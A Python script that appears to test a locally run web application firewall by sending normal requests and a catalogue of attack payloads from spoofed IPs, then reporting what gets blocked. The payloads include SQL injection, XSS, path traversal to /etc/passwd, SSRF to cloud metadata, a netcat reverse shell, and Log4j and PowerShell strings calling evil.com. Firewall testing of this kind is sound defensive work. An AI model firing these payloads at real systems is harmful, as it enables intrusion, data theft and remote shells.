import requests
import time
import random

# Target WAF URL
BASE_URL = "http://localhost:8080"
# Use HTTPS if your WAF is running TLS
# BASE_URL = "https://localhost:8443"

# List of simulated IPs
IPS = [
    # Normal Users
    "192.168.1.101",
    "192.168.1.102",
    "10.0.0.5",
    
    # Suspicious IPs (Simulated)
    "203.0.113.1",
    "203.0.113.2",
    
    # Attackers (will likely get blocked)
    "198.51.100.10",
    "198.51.100.11",
    "198.51.100.12"
]

# Normal requests
NORMAL_PATHS = ["/", "/about", "/contact", "/products", "/login", "/search?q=apple"]

# Attack payloads by category
ATTACK_PAYLOADS = {
    # 1. SQL Injection (SQLi)
    "SQLi": [
        "/?id=1 OR 1=1",
        "/?q=' UNION SELECT username, password FROM users--",
        "/?id=1; DROP TABLE users--"
    ],
    
    # 2. Cross-Site Scripting (XSS)
    "XSS": [
        "/?search=<script>alert(1)</script>",
        "/?q=<img src=x onerror=alert(1)>",
        "/?redirect=javascript:alert('XSS')"
    ],
    
    # 3. Remote Code Execution (RCE)
    "RCE": [
        "/?cmd=cat /etc/passwd",
        "/?q=| whoami",
        "/?file=; netcat -e /bin/sh 10.0.0.1 8080"
    ],
    
    # 4. Path Traversal & LFI
    "LFI": [
        "/../../etc/passwd",
        "/?file=../../../../windows/win.ini",
        "/?page=php://filter/convert.base64-encode/resource=index.php"
    ],
    
    # 5. Server-Side Request Forgery (SSRF)
    "SSRF": [
        "/?url=http://127.0.0.1:8080/admin",
        "/?webhook=http://169.254.169.254/latest/meta-data/",
        "/?image=file:///etc/passwd"
    ],
    
    # 6. XML External Entity (XXE)
    # Note: These usually go in POST body, here we simulate via URL for simplicity or small body
    "XXE": [
        "/?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        "/?data=<!ENTITY % xxe SYSTEM 'http://evil.com/xxe'>%xxe;"
    ],
    
    # 7. NoSQL Injection
    "NoSQLi": [
        "/?user[$ne]=null&pass[$ne]=null",
        "/?q={$where: 'this.password.length > 0'}"
    ],
    
    # 8. Log4j
    "Log4j": [
        "/?q=${jndi:ldap://evil.com/x}",
        "/?user=${jndi:dns://attacker.com/leak}"
    ],
    
    # 9. Shellshock
    # Usually in headers, but we put here to be picked up by generic rules too
    "Shellshock": [
        "/?ua=() { :;}; /bin/bash -c 'sleep 5'"
    ],
    
    # 10. Windows RCE
    "WinRCE": [
        "/?cmd=cmd.exe /c dir",
        "/?exec=powershell.exe -Command 'Invoke-WebRequest evil.com'"
    ],
    
    # 11. Sensitive Files
    "Sensitive": [
        "/.env",
        "/.git/config",
        "/wp-config.php"
    ]
}

def test_ip(ip, is_attacker=False):
    print(f"\n--- Testing IP: {ip} ({'Attacker' if is_attacker else 'Normal'}) ---")
    
    headers = {
        "X-Forwarded-For": ip,
        "User-Agent": "MultiIPTester/1.0"
    }

    # Decide what kind of requests to send
    if is_attacker:
        # Attackers send mixture of normal and bad requests
        # Pick 3 random attack categories
        categories = random.sample(list(ATTACK_PAYLOADS.keys()), 3)
        paths = random.sample(NORMAL_PATHS, 1)
        for cat in categories:
            payload = random.choice(ATTACK_PAYLOADS[cat])
            paths.append(payload)
            
        # Add a scanner user-agent check randomly
        if random.random() > 0.5:
            headers["User-Agent"] = "sqlmap/1.4.7"
            paths.append("/")
    else:
        # Normal users mostly send normal requests
        paths = random.sample(NORMAL_PATHS, 3)

    for path in paths:
        url = BASE_URL + path
        try:
            print(f"Request: {path[:50]}..." if len(path) > 50 else f"Request: {path}")
            
            # For XXE or complex payloads, POST might be better, but GET covers most URL rules
            response = requests.get(url, headers=headers, verify=False)
            
            status = response.status_code
            waf_status = response.headers.get("X-WAF-Status", "ALLOW")
            
            status_color = "🔴" if status == 403 else "🟢"
            print(f"  -> {status_color} Status: {status} | WAF: {waf_status}")
            
        except requests.exceptions.RequestException as e:
            print(f"  -> Connection Error: {e}")
        
        # Small delay between requests
        time.sleep(0.1)

def main():
    print(f"Starting Multi-IP WAF Test against {BASE_URL}")
    print("---------------------------------------------")
    
    try:
        requests.get(BASE_URL, timeout=1, verify=False)
    except:
        print("Error: Could not connect to WAF. Make sure it is running.")
        return

    # shuffle IPs to make it interesting
    test_ips = IPS.copy()
    random.shuffle(test_ips)

    for ip in test_ips:
        # Determine if this IP should act aggressively
        is_attacker = ip.startswith("198.51.100") or ip.startswith("203.0.113")
        test_ip(ip, is_attacker)
        time.sleep(1)

    print("\n---------------------------------------------")
    print("Test Complete. Check the Dashboard for results.")

if __name__ == "__main__":
    main()
